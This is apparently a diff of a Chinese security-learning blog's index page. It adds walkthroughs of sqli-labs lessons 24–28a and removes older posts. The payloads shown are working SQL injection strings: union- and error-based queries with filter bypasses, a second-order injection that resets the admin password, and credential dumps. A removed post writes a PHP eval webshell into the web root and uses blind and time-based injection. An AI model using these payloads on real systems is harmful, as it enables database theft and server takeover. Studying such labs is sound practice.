@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -167,6 +167,249 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/31/lesson27/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/31/lesson27/" class="post-title-link" itemprop="url">lesson27_28a</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-01-31 13:36:21" itemprop="dateCreated datePublished" datetime="2022-01-31T13:36:21+08:00">2022-01-31</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:26:39" itemprop="dateModified" datetime="2022-02-18T20:26:39+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p>
+<p>因为没有报错的回显所以我们采用联合查询</p>
+<p>又因为select和union又被过滤，所以我们采用uNion和sElect </p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p>
+<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p>
+<h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p>
+<p>主要是空格用%a0或者%0b来代替</p>
+<h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p>
+<p>是（’’）的包裹方式</p>
+<p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p>
+<p>?id=0’)||left(database(),2)=’se’;%00</p>
+<p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p>
+<p>盲注爆出库，表，列</p>
+<h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/lesson24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/26/lesson24/" class="post-title-link" itemprop="url">lesson24_26a</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-01-26 11:14:16" itemprop="dateCreated datePublished" datetime="2022-01-26T11:14:16+08:00">2022-01-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:28:11" itemprop="dateModified" datetime="2022-02-18T20:28:11+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="lesson-24-second-order-injection-二次注入"><a href="#lesson-24-second-order-injection-二次注入" class="headerlink" title="lesson 24 second order injection(二次注入)"></a>lesson 24 second order injection(二次注入)</h1><p>第一步：插入恶意数据</p>
+<p>  第一次进行数据库插入数据的时候 ，仅仅对其中的特殊符号进行转移，在写入数据库的时候还是保留的原来的数据，但是数据本身包含恶意内容。</p>
+<p>第二步：引用恶意数据</p>
+<p>  在将数据存入数据库后，开发者认为数据是可信的，在下一次需要进行的查询的时候，直接从数据库中提取出恶意的数据，没有进行进一步的审查和处理，就会造成sql的二次注入</p>
+<p><img src="https://s2.loli.net/2022/02/10/3epZOLiJ2jVUSN8.png" alt="QQ截图20220210114019.png"></p>
+<p>一开始有一个普通用户</p>
+<p><img src="https://s2.loli.net/2022/02/10/DsGjFoLQ37cxZrT.png" alt="QQ截图20220210130715.png"></p>
+<p>账号：admin</p>
+<p>密码：admin</p>
+<p>然后我们（黑客）注册一个新的账号</p>
+<p><img src="https://s2.loli.net/2022/02/10/HhZUVG63Bp4JleE.png" alt="QQ截图20220210130845.png"></p>
+<p>账号：admin’#        </p>
+<p>密码：123456</p>
+<p>然后登入修改密码。</p>
+<p><img src="https://s2.loli.net/2022/02/10/x1IZWh4JC7HBVE6.png" alt="QQ截图20220210131006.png"></p>
+<img src="https://s2.loli.net/2022/02/10/jMmFSRH2pQwLWbd.png" alt="QQ截图20220210131200.png" style="zoom:150%;" />
+
+<p>然后当我们用admin的帐号登入时，发现密码被恶意修改了</p>
+<p><img src="https://s2.loli.net/2022/02/10/TtXzn9W8HoUGPxe.png" alt="QQ截图20220210131303.png"></p>
+<p>这里就是在我们用admin‘#的账号修改密码时，数据库提取我们的恶意数据没有进行转意使得原本用来修改密码的语句:</p>
+<p>UPDATE users SET PASSWORD=’$pass’ where username=’admin’#’ and password=’&amp;curr_pass’</p>
+<p>变成了</p>
+<p>UPDATA users SET PASSWORD=’$pass’ where username=’admin’</p>
+<p>导致密码被修改。。。。</p>
+<h1 id="lesson25"><a href="#lesson25" class="headerlink" title="lesson25"></a>lesson25</h1><p>黑名单里面 ‘or’ ‘and’被过滤了</p>
+<p><img src="https://s2.loli.net/2022/02/10/vYLRFpD6jd8o291.png" alt="QQ截图20220210131449.png"></p>
+<p>用双写来绕过</p>
+<p>数据库</p>
+<p>?id=-1’ union select 1,database(),3 anandd ‘1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/mRkdLg6e8vZbBDy.png" alt="QQ截图20220210163701.png"></p>
+<p>表</p>
+<p>?id=-1’ union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3 anandd ‘1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/javtyi4HwoYlEeK.png" alt="QQ截图20220210165641.png"></p>
+<p>列</p>
+<p>?id=-1’ union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3 anandd ‘1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/78Cobgc6xOWniBr.png" alt="QQ截图20220210170055.png"></p>
+<p>字段</p>
+<p>?id=-1’ union select 1,(select group_concat(concat_ws(‘@@’,id,username,passwoorrd))from users),3 anandd ‘1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/ekXN37wJZHVj14q.png" alt="QQ截图20220210171358.png"></p>
+<p>PS:information和password里面都有or要双写。</p>
+<h1 id="lesson-25a"><a href="#lesson-25a" class="headerlink" title="lesson 25a"></a>lesson 25a</h1><p>与上一关相同</p>
+<p>同样的黑名单过滤了or和and</p>
+<p>就是闭合不同。。。</p>
+<h1 id="lesson26"><a href="#lesson26" class="headerlink" title="lesson26"></a>lesson26</h1><p><img src="https://s2.loli.net/2022/02/10/gePrwp1ZIFacDM2.png" alt="QQ截图20220210173023.png"></p>
+<p>查库</p>
+<p>?id=1’||updatexml(1,concat(0x7e,(database())),1)||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/XaRNkyO5PG3ovUA.png" alt="QQ截图20220210221443.png"></p>
+<p>查表</p>
+<p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/tB5bxJQDqmkphzl.png" alt="QQ截图20220210221611.png"></p>
+<p>查列</p>
+<p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))),1)||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/10/dJGyOLD13MxXIVW.png" alt="QQ截图20220210221718.png"></p>
+<p>字段</p>
+<p>?id=1’||updatexml(1,concat(0x7e,(select    (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  )),1)||’1’=’1</p>
+<p><img src="https://s2.loli.net/2022/02/11/O9I65hUse34rL71.png" alt="QQ截图20220210230328.png"></p>
+<p>%a0也可以充当空格，注释符可以用;%00或者||’1’=’1</p>
+<h1 id="lesson-26a"><a href="#lesson-26a" class="headerlink" title="lesson 26a"></a>lesson 26a</h1><p>黑名单一样只是闭合多了括号</p>
+<p>因为没有报错信息，所以我们只能用联合查询</p>
+<p>黑名单中对空格做了过滤，所以我们可以用%a0来代替空格</p>
+<p>基本与lesson26相同</p>
+<p>?id=1’) %a0 union %a0 select%a0 1,2,3 || (‘1’)=(‘1</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -344,69 +587,6 @@
 <p><a target="_blank" rel="noopener" href="http://www.mxcz.net/tools/rot13.aspx">凯撒ROT13在线解码</a></p>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Dog_Captain/article/d">https://blog.csdn.net/Dog_Captain/article/d</a></p>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/28/Untitled/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/28/Untitled/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-11-28 09:32:43" itemprop="dateCreated datePublished" datetime="2021-11-28T09:32:43+08:00">2021-11-28</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          
       
     </div>
 
@@ -1077,105 +1257,6 @@
 <p>15       ‘’</p>
 <p>16       (“”)</p>
 <p>less13,14,15,16同样的方法只是对数据的包裹方式不同。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/04/less7-8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/04/less7-8/" class="post-title-link" itemprop="url">less7-10</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-11-04 17:53:22 / Modified: 18:13:03" itemprop="dateCreated datePublished" datetime="2021-11-04T17:53:22+08:00">2021-11-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="less7（一句话木马的利用）"><a href="#less7（一句话木马的利用）" class="headerlink" title="less7（一句话木马的利用）"></a>less7（一句话木马的利用）</h1><p>首先按部就班试出</p>
-<p>？id=1‘))–+</p>
-<p>利用order by查出数据库列数 </p>
-<p>提示是use outfile </p>
-<p>into outfile 是写文件的指令，资料<a target="_blank" rel="noopener" href="https://blog.csdn.net/cuiruidu3106/article/details/100439103?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen">引用csdn的大佬</a></p>
-<p>利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7\a.php”–+将一句话木马写入</p>
-<p><img src="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png" alt="QQ截图20211104171541.png"></p>
-<p>这里报错了没事，现在文件已经写到我们想要的地方</p>
-<p><img src="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png" alt="QQ截图20211104173133.png"></p>
-<p>然后使用菜刀访问即可！</p>
-<p><img src="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png" alt="QQ截图20211104171109.png"></p>
-<p>ps：操作前提该网站允许文件的读入操作，不然会一直报错且菜刀也访问不到文件。</p>
-<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><h2 id="方法一-布尔盲注"><a href="#方法一-布尔盲注" class="headerlink" title="方法一 布尔盲注"></a>方法一 布尔盲注</h2><p>输入？id=1‘判断存在注入错误</p>
-<p>输入？id=1’ order by 3–+ 当3改成4时报错说明只有4列</p>
-<p>输入？id=1‘and left（（database（）），1）=’s‘–+ 猜出第一位</p>
-<p>或者采用？id=1’‘and ascii（substr（（database（）），1,1））&gt;16</p>
-<p>或者输入？id=1’ and ascii((select schema_name from information_schema.schemata limit 1,1)1,1)&gt;17–+也可以回应，判断数据库名</p>
-<p>输入？id=1‘and acii（（select table_name from information_schema.tables where table_schema=’scurity’））&gt;115–+判断表名</p>
-<p>输入？id=1’and ascii（（select column_name from information_schema.columns where table_name=’user’））&gt;10–+判断表中字段。</p>
-<p>以上语句配合burpsuite进行使用（与lesson5,6同理）。</p>
-<h2 id="法二-时间盲注"><a href="#法二-时间盲注" class="headerlink" title="法二 时间盲注"></a>法二 时间盲注</h2><p>？id=1‘ and sleep（5）–+判断存在注入 如果可以会延迟5秒回应（对比可见延迟）</p>
-<p><img src="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png" alt="QQ截图20211104174905.png"></p>
-<p><img src="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png" alt="QQ截图20211104175501.png"></p>
-<p>输入？id=1‘ and if(length(database())=8,1,sleep(5))–+如果为8则页面会较快的刷新，如果不为8则会延迟5秒刷新</p>
-<p>输入？id=1’ and if（ascii（substr（select database（），1,1））&gt;113,1,sleep(5))–+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5秒</p>
-<h1 id="less-9和less-10"><a href="#less-9和less-10" class="headerlink" title="less 9和less 10"></a>less 9和less 10</h1><p>less9和less10中可以使用时间盲注但不可以使用布尔盲注，less10只是将单引号改成了双引号</p>
 
       
     </div>
